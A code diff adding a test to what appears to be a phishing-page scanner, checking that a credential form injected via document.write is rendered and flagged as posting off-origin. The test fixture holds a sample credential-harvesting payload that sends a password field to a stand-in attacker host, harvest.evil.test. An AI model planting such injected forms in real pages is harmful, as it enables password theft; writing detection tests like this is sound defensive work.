@@ -34,6 +34,17 @@ test("render-and-scan surfaces an externally-injected credential form + behavior
   expect(behaviorFindings(report, url).length).toBeGreaterThan(0);
 });
 
+test("render-and-scan materializes a document.write-injected credential form", async () => {
+  const url = "https://dynamic.example/";
+  // The form exists only as a string inside an inline script until document.write
+  // runs — htmlparser2 correctly won't parse markup inside <script>, so detection
+  // depends on the form actually materializing in the rendered DOM.
+  const page = `<html><body><script>document.write('<form action="https://harvest.evil.test/p" method="post"><input type="password" name="pw"></form>')</script></body></html>`;
+  const { html } = await renderAndScan(page, { url });
+  expect(html).toMatch(/<form[^>]*harvest\.evil\.test/i);
+  expect(scanRuleIds(html, url)).toContain("credential_form_posts_off_origin");
+});
+
 test("render-and-scan stays quiet on a benign page (no creds, no brand)", async () => {
   const { html } = await renderAndScan(
     `<html><head><title>Acme Widgets</title></head><body><div id="x"></div>
